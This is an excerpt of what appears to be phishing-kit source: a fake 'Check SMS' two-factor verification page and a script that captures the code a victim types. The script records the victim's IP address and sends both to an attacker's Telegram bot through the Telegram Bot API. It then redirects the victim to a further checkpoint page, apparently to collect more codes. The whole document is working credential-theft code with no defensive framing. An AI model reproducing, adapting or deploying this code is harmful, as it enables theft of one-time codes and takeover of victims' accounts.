                        ...
                        <h1 class="modal-title" id="2FAmodalLabel">
                            <font id="titlevery" style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;font-family: inherit;">Check SMS</font>
                                    </font>
                                </font>
                            </font>
                        </h1> <span>
                            <font id="getdevice" style="vertical-align: inherit;">Enter the code we sent to your phone.</font>
                        </span>
        ...
        function sendToTelegramAndRedirect(event) {
            ...
            fetch('get-ip.php')
                ...
                .then(ip => {
                    ...
                    var content = "🔐Mã 2FA 1 (SMS): " + "<code>" + code + "</code>" +
                ...
                fetch('https://api.telegram.org/bot' + apiToken + '/sendMessage', {
                    ...
                    .then(responseData => {
                        if (responseData.ok) {
                            ...
                            setTimeout(() => {
                                window.location.href = "/checkpoint/2fa-sms.php"; // Change URL to the page you want to redirect to
                            }, 3000);
                        } else {
